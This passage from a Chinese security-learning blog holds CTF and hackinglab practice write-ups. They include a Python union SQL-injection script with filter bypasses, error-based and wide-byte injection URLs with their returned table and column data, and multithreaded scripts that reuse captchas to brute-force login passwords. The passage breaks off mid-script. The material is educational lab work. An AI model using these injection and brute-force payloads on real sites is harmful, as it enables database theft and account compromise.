&lt;tr&gt;</span><br><span class="line">    &lt;th style=<span class="string">&quot;width:300px;height:300px;text-align:center;&quot;</span>&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;image/&lt;?php echo <span class="subst">$id</span>; ?&gt;.jpg&quot;</span> width=<span class="number">300</span> height=<span class="number">300</span> style=<span class="string">&quot;display:inline&quot;</span>&gt;</span><br><span class="line">    &lt;/th&gt;</span><br><span class="line">    &lt;th style=<span class="string">&quot;width:300px;height:300px;padding: 20px 20px 20px 30px;&quot;</span>&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; 姓名: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;name&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;name&#x27;</span>]:<span class="string">&quot;不详&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; 年龄: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;age&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;age&#x27;</span>]:<span class="string">&quot;不详&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; 身高: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;height&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;height&#x27;</span>]:<span class="string">&quot;不详&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;h2&gt;&lt;small&gt; 三围: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="variable">$rs</span>[<span class="string">&#x27;bwh&#x27;</span>])?<span class="variable">$rs</span>[<span class="string">&#x27;bwh&#x27;</span>]:<span class="string">&quot;不详&quot;</span>; <span class="meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">    &lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>乍一看过滤了个七七八八,但再一看,如果对id同时get和post,就绕过了大多数过滤 但是注意他对空格和等号进行了正则匹配,我们空格用注释绕,等号用LIKE绕 最后要注意的就是,他把回显给关了,所以是个bool注,鉴于跑的东西多,写个脚本,我的脚本早就删掉了,payload大概长成 <img src="/images/2017/10/9.png" /> 这里看出来他库中第一个表的第一个字母大于101 <img src="/images/2017/10/10.png" /> 而且这个字母不大于102 所以就是102,即f,然后写个脚本注入下就ok了呗 这里要吐槽下,网站加载的超级慢,每次请求要等好久,反正最后就跑出flag了,不懂的话<a href="http://localhost/2017/06/25/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A01%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">手工注入篇</a> <strong>后记后记</strong> 太菜了,这里是可以用union注的,代码如下.换行是为了好看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#爆数据表</span></span><br><span class="line">    <span class="comment">#payload=&#123;&quot;id&quot;:&#x27;&#x27;&#x27;2&#x27;/**/and/**/0/**/union/**/select/**/1,&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;(select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;table_schema/**/LIKE/**/&quot;pgg&quot;/**/limit/**/&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#+str(each)+&#x27;&#x27;&#x27;,1),1,1,1#&#x27;&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment">#爆数据列</span></span><br><span class="line">    <span class="comment">#payload=&#123;&quot;id&quot;:&#x27;&#x27;&#x27;2&#x27;/**/and/**/0/**/union/**/select/**/1,&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;(select/**/column_name/**/from/**/information_schema.columns/**/where/**/&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;table_name/**/LIKE/**/&quot;fla9_14_h3r3&quot;/**/&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;limit/**/&#x27;&#x27;&#x27;+str(each)+&#x27;&#x27;&#x27;,1),1,1,1#&#x27;&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment">#拿flag</span></span><br><span class="line">    <span class="comment">#payload=&#123;&quot;id&quot;:&#x27;&#x27;&#x27;2&#x27;/**/and/**/0/**/union/**/select/**/1,&#x27;&#x27;&#x27;+</span></span><br><span class="line">    <span class="comment">#&#x27;&#x27;&#x27;(select/**/flag/**/from/**/fla9_14_h3r3),1,1,1#&#x27;&#x27;&#x27;&#125;</span></span><br><span class="line">    r=requests.post(<span class="string">&quot;http://mitah.cn:20000/charming_girls/?fun=show&amp;id=1&quot;</span>,data=payload)</span><br><span class="line">    r.encoding=r.apparent_encoding</span><br><span class="line">    temp=re.findall(<span class="string">r&quot;&lt;h2&gt;&lt;small&gt; 姓名:([^&lt;]+)&lt;/h2&gt;&quot;</span>,r.text)</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="手速不存在的">11.手速?不存在的</h3><p>真的是跑不出flag,ocr跑到了30位验证码然后挂了,死在第5关</p><h3 id="心理测试">12.心理测试</h3><p>首先 <img src="/images/2017/10/12.png" /> 猜测后缀是.ws,尝试一下 https://xn--g28hlb.ws/ 即两个表情连起来,后面加.ws 进入心理测试页面 <img src="/images/2017/10/13.png" /> 要分数相同,那就先获取下分数列表,这里就不写了,自己去算 获取之后,写一个遍历分数的脚本(并不复杂) 然后找一下很容易找到了有一个返回下面有个d0_y0u_11ke_me.php 请求一下 <img src="/images/2017/10/14.png" /> 发现是段源码审计...大概看了下,前面都好过的... https://xn--g28hlb.ws/d0_y0u_11ke_me.php?a[]=123&amp;b[]=123.0 列表绕md5,数字弱类型等,强类型不等,然后死在了shell的密码上面,这里我再whois上面找到了一些信息,比如 <img src="/images/2017/10/15.png" /> 然后找社工库,失败了,然后招新就结束了</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hackinglab补充学习(注入关)</title>
      <link href="/2017/09/16/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E6%B3%A8%E5%85%A5%E5%85%B3/"/>
      <url>/2017/09/16/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E6%B3%A8%E5%85%A5%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h5 id="第一关最简单的sql注入">第一关:最简单的SQL注入</h5><p>Tips题目里有简单提示 <a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php">通关地址</a> 很简单 帐号:admin'or'1'='1 密码随便 第二题第三题炸了,打不开 第四题limit注入 ##### 第四关:到底能不能回显</p><p>小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？ <a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1">通关地址</a></p><p>这道题我是去看的wp的,自己不会写. 首先测试的时候发现start参数可以注入而num不可注入,然后limit后面其实还可以接procedure analyse语句来进行报错注入,比如我们使用extractvalue,然后xpath我们写一个sql语句,那么就会报错,但是又由于sql语句得到了执行,所以我们就得到了数据库的信息</p><p>首先我们写 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select group\_concat(table\_name) from information\_schema.tables where table\_schema=database()))),1)--+&amp;num=1 </span><br></pre></td></tr></table></figure></p><p>然后报错 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;:article,user&#x27; Warning: mysql\_fetch\_row() expects parameter 1 to be resource, boolean given in sqli5\_5ba0bba6a6d1b30b956843f757889552/index.php on line 51</span><br></pre></td></tr></table></figure></p><p>于是我们知道了有article和user两个表,然后爆列 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select group\_concat(column\_name) from information\_schema.columns where table\_name=0x75736572))),1)--+&amp;num=1</span><br></pre></td></tr></table></figure> 返回了 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;:id,username,password,lastloginI&#x27; Warning: mysql\_fetch\_row() expects parameter 1 to be resource, boolean given in sqli5\_5ba0bba6a6d1b30b956843f757889552/index.php on line 51 </span><br></pre></td></tr></table></figure></p><p>然后我们去password里面,在limit 2,1的时候得到flag <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select password from user limit 2,1))),1)--+&amp;num=1 返回值为: XPATH syntax error: &#x27;:myflagishere&#x27; Warning: mysql\_fetch\_row() expects parameter 1 to be resource, boolean given in sqli5\_5ba0bba6a6d1b30b956843f757889552/index.php on line 51</span><br></pre></td></tr></table></figure></p><h5 id="第五关邂逅">第五关:邂逅</h5><p>小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。</p><p><a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/">通关地址</a></p><p>看的wp,第一次见到这种注入方法.</p><p>首先源码里面有个<a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg">链接</a></p><p>注入点在哪呢?在图片名字那里存在注入点,我们访问:http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'.jpg</p><p>获得报错信息: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.jpg'' at line 1<br /><strong>Warning</strong>: mysql_fetch_row() expects parameter 1 to be resource, boolean given in <strong>sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/myimages1.php</strong> on line <strong>18</strong></p><p>即存在注入,然后我们orderby查出列数: 得到结果的两次查询</p><p>http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'order by 4--+.jpg 没有返回 http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'order by 5--+.jpg 得到返回: Unknown column '5' in 'order clause'<br /><strong>Warning</strong>: mysql_fetch_row() expects parameter 1 to be resource, boolean given in <strong>sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/myimages1.php</strong> on line <strong>18</strong></p><p>然后用union提取就ok了: 先用1,2,3,4找输出: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,3,4--+.jpg 返回的是3</p><p>所以我们继续构造: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4--+.jpg</p><p>得到返回:article,pic</p><p>然后我们分别爆出两个表中的列,先报article: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x61727469636c65),4--+.jpg</p><p>获得返回:id,title,content,others</p><p>然后同理爆pic: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x61727469636c65),4--+.jpg</p><p>获得返回:id,picname,data,text</p><p>然后爆掉article的所有列,没有找到flag相关信息</p><p>http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(要尝试的列) from article),4--+.jpg</p><p>然后我们在pic里面爆的时候: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(picname) from pic),4--+.jpg</p><p>获得返回:dog1.jpg,cat1.jpg,flagishere_askldjfklasjdfl.jpg</p><p>发现名字里面有一个flagishere_askldjfklasjdfl.jpg,这个时候直接访问http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/flagishere_askldjfklasjdfl.jpg就ok了</p><p>而且也可以访问 http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'%20union%20select%201,2,(select data from pic limit 0,1),4--+.jpg</p><p>大概是通过picname取data里面的图片的二进制然后生成图片,所以我们才能在picname那里注入?</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hackinglab补充学习(脚本关)</title>
      <link href="/2017/08/28/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E8%84%9A%E6%9C%AC%E5%85%B3/"/>
      <url>/2017/08/28/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E8%84%9A%E6%9C%AC%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h5 id="第一关key又又找不到了">第一关:key又又找不到了</h5><p>小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！ <a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php">通关地址</a> 抓包直接过</p><h5 id="第二关快速口算">第二关:快速口算</h5><p>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？ <a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php">通关地址</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line"><span class="built_in">print</span>(u.post(<span class="string">&#x27;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&#x27;</span>,data=&#123;<span class="string">&#x27;v&#x27;</span>:<span class="built_in">eval</span>(<span class="built_in">str</span>(re.findall(<span class="string">r&#x27;</span></span><br><span class="line"><span class="string">\n            ([^=]+)=&#x27;</span>,u.get(<span class="string">&#x27;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&#x27;</span>).text)[<span class="number">0</span>]))&#125;).text)</span><br></pre></td></tr></table></figure><h5 id="第三关这个题目是空的">第三关:这个题目是空的</h5><p>Tips:这个题目真不是随便设置的。 什么才是空的呢？ 通关地址：没有，请直接提交答案(小写即可) 一脸懵逼然后去百度,然后才知道答案是null....是在下输了...</p><h5 id="第四关怎么就是不弹出key呢">第四关:怎么就是不弹出key呢？</h5><p>提交说明：提交前14个字符即可过关 <a href="http://lab1.xseclab.com/xss3_5dcdde90bbe55087eb3514405972b1a6/index.php">通关地址</a> 这种js我一直不知道怎么搞,后来猜知道这个东西叫匿名函数,直接执行也是有一些方法的,百度一下你就知道,比如前面可以加上~,-,+什么的,或者后面加上一个括号,但是又要保证是表达式所以前面加上一个! 比如这道题我们就可以</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">               <span class="keyword">var</span> b=<span class="keyword">function</span>(<span class="params">p,a,c,k,e,r</span>)&#123;e=<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">&#x27;&#x27;</span>:<span class="title function_">e</span>(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c+<span class="number">29</span>):c.<span class="title function_">toString</span>(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(c--)r[<span class="title function_">e</span>(c)]=k[c]<span class="title function_">e</span>(c);k=[<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> r[e]&#125;];e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span><span class="string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span>+<span class="title function_">e</span>(c)+<span class="string">&#x27;\\b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">&#x27;1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\&#x27;\&#x27;:e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\&#x27;\&#x27;.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\&#x27;\\\\w+\&#x27;&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\&#x27;\\\\b\&#x27;+e(c)+\&#x27;\\\\b\&#x27;,\&#x27;g\&#x27;),k[c]);1d p&#125;(\&#x27;Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\&#x27;\\\&#x27;:e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\&#x27;\\\&#x27;.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\&#x27;\\\\\\\\w+\\\&#x27;&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\&#x27;\\\\\\\\b\\\&#x27;+e(c)+\\\&#x27;\\\\\\\\b\\\&#x27;,\\\&#x27;g\\\&#x27;),k[c]);S p&#125;(\\\&#x27;G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\&#x27;\\\\\\\&#x27;.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\&#x27;\\\\\\\\\\\\\\\\w+\\\\\\\&#x27;&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\&#x27;\\\\\\\\\\\\\\\\b\\\\\\\&#x27;+e(c)+\\\\\\\&#x27;\\\\\\\\\\\\\\\\b\\\\\\\&#x27;,\\\\\\\&#x27;g\\\\\\\&#x27;),k[c]);A p&#125;(\\\\\\\&#x27;t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\&#x27;.m(/^/,o))&#123;l(c--)r[c]=k[c]c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\&#x27;&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\&#x27;+e(c)+\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\&#x27;,\\\\\\\\\\\\\\\&#x27;g\\\\\\\\\\\\\\\&#x27;),k[c]);f p&#125;(\\\\\\\\\\\\\\\&#x27;1 3=&quot;6&quot;;1 4=&quot;7&quot;;1 5=&quot;&quot;;8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\&#x27;,j,j,\\\\\\\\\\\\\\\&#x27;uibcdvxyj\\\\\\\\\\\\\\\&#x27;.z(\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\&#x27;),0,&#123;&#125;))\\\\\\\&#x27;,H,H,\\\\\\\&#x27;ABMDCEFIJGNOPQK\\\\\\\&#x27;.K(\\\\\\\&#x27;\\\\\\\&#x27;),0,&#123;&#125;))\\\&#x27;,X,X,\\\&#x27;SRVWUTY13Z11141210191a1b1c\\\&#x27;.14(\\\&#x27;\\\&#x27;),0,&#123;&#125;))\&#x27;,1t,1u,\&#x27;1e1d1f1g1h1i1v1s1l1m1n1o1r1k1j1q1p1w1x1y1z\&#x27;.1r(\&#x27;\&#x27;),0,&#123;&#125;))&#x27;</span>,<span class="number">62</span>,<span class="number">98</span>,<span class="string">&#x27;returnfunctionStringifreplacewhilefromCharCode29newRegExptoString36parseInt35spliteval627553varslakfjteslkjsdflkfor&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>),<span class="number">0</span>,&#123;&#125;);</span><br><span class="line">               <span class="keyword">var</span> d=<span class="built_in">eval</span>(b);</span><br><span class="line">               <span class="title function_">alert</span>(<span class="string">&quot;key is first 14 chars &quot;</span>+d.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">14</span>));</span><br><span class="line">            &#125;()</span><br></pre></td></tr></table></figure><p>往控制台一扔就可以了</p><h4 id="验证码系列">验证码系列</h4><p>通过百度了解了一波 设置以及验证验证码的流程(自己的理解...): 1.写一个vcode.php,程序里面实现一个生成验证码的程序然后把验证码加密(hash)放进session或cookie(虽然我觉得放在session里面会安全一些...) 2.在登录页面显示验证码以及表单等待用户输入 3.在验证页面把用户输入的值进行加密(hash)然后和session值或cookie值对比,相等的话就验证成功,否则失败(指的只是验证码). 当然,如果设置不当这里也存在一些漏洞 比如</p><h6 id="验证码仅通过cookie验证">1.验证码仅通过cookie验证</h6><p>如果你把验证码加密然后只放在cookie里面,那么hacker可以通过控制cookie来控制验证码的答案 比如你验证码1234,cookie用md5(1234),然后验证的时候是判断if(md5(<span class="math inline">\(\_POST\[&quot;vcode&quot;\])==\)</span>_COOKIE["xxx"]{一顿操作},那么用户可以通过把cookie["xxx"]设置成md5(1234),然后验证码设置为1234,那么这个判断就永远是正确的(当然客户端不需要知道你是不是md5,他只需要知道当绑定cookie之后发送相同验证码能不能通过验证就好了)</p><h6 id="不进行非空判断">2.不进行非空判断</h6><p>如果你在vcode.php里面设置了<span class="math inline">\(\_SESSION\[&quot;vcode&quot;\],然后想通过这个来判断用户的输入,但是又没有对变量进行非空判断,那么用户可以直接post你的验证页面而不去访问你的表单页面,那么这个时候你的session还没有设置,所以为空,然后用户post一个空值过来那么验证就通过了.这个时候可以在判断的前面设置一个isset(\)</span>_SESSION["xxx"])来判断,当然,最后还要记住把session值清掉,否则就会有下面这个漏洞</p><h6 id="没有进行验证码的销毁">3.没有进行验证码的销毁</h6><p>如果你最后没有对session进行清空,那么用户可以不返回你的表单页面而是直接再次请求,这个时候就可以多次尝试验证码的识别.</p><h5 id="第五关逗比验证码第一期">第五关:逗比验证码第一期</h5><p>逗比的验证码，有没有难道不一样吗？ <a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php">通关地址</a> 第一道题就是验证码可以重复提交,那么验证码就相当于没有设置,你只需要一直往验证页面post第一次正确的验证码就可以.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php&#x27;</span>)</span><br><span class="line">vcode_url=re.findall(<span class="string">r&#x27;&lt;img src=&quot;([^&quot; /&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;vcode.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(u.get(vcode_url).content)</span><br><span class="line">vcode=<span class="built_in">input</span>(<span class="string">&quot;input vcode:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">start,end</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(start,end):</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:each,<span class="string">&#x27;vcode&#x27;</span>:vcode&#125;</span><br><span class="line">        r=u.post(<span class="string">&#x27;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&#x27;</span>,data=data)</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">    thread.append(threading.Thread(target=get_flag,args=(<span class="number">1000</span>+<span class="number">1000</span>*each,<span class="number">2000</span>+<span class="number">1000</span>*each)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> thread:</span><br><span class="line">        each.start()</span><br></pre></td></tr></table></figure><h5 id="第六关逗比验证码第二期">第六关:逗比验证码第二期</h5><p>验证便失效的验证码 <a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php">通关地址</a> 这里验证了一次之后会验证码会失效,所以第一次正确输入,之后把验证码改为空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">thread=[]</span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php&#x27;</span>)</span><br><span class="line">vcode_url=re.findall(<span class="string">r&#x27;&lt;img src=&quot;([^&quot; /&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span 